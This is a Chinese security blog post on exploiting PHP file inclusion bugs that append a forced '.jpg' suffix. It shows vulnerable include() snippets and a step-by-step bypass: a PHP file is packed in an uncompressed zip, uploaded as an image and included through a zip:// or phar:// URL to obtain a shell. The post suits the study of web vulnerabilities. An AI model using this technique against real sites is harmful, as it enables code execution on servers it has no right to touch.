# 通过 zip/phar 协议包含文件

Jun 07,2015 in [安全研究](https://lightless.me/category/SecurityResearch/),[PHP](https://lightless.me/category/php/) lang [繁](javascript:translatePage();) read (4403)

以前的 CTF 中见过这种很神奇的协议，上周墙网杯又见到了，再总结一下，在实际中的应用也是比较多的，算是一个比较实用的技巧。

假设有类似以下的 PHP 代码段。

```
<?php
    $file = $_GET['file'];
    include($file.".jpg");
?>

```

很明显看出来这是个文件包含，但是将传递的文件名后面强制加了一个`".jpg"`的后缀，导致了无法任意文件包含。但是我们可以通过`zip`协议绕过这个限制，我们看一下 PHP 官方文档中对这个协议的描述：`http://php.net/manual/zh/wrappers.compression.php`

其中有一段用法：`zip://archive.zip#dir/file.txt`。看到这个之后应该就能明白如何绕过了。
首先我们新建一个`test.php`文件，内容如下：

```
<?php
    phpinfo();
?>

```

并将其改名为`test.jpg`，因为上面的代码只能包含 jpg 文件嘛。然后将其压缩成`zip`包，压缩的时候注意要选择`only store`之类的选项，防止数据被压缩。然后将这个 zip 的后缀改为 jpg 之类的，目的是可以成功上传。之后我们就可以通过：

```
http://example.com/include/include2.php?file=zip://test.zip%23test

```

这样的形式`getshell`了。

对于如下的代码段：

```
<?php
    $file = $_GET['file'];
    if (isset($file) && strtolower(substr($file, -4)) == ".jpg") {
        include($file)
    }
?>

```

也可以通过相似的方法 getshell，这里就不再赘述了。无非就是 %23test.jpg 之类的呗。

除了`zip`协议，还有`phar`协议也可以做到类似的事情。参考：`http://php.net/manual/zh/wrappers.phar.php`
基本上和`zip`差不多，区别就是`phar://php.zip/php.jpg`中是用`/`来分隔而不是`#`。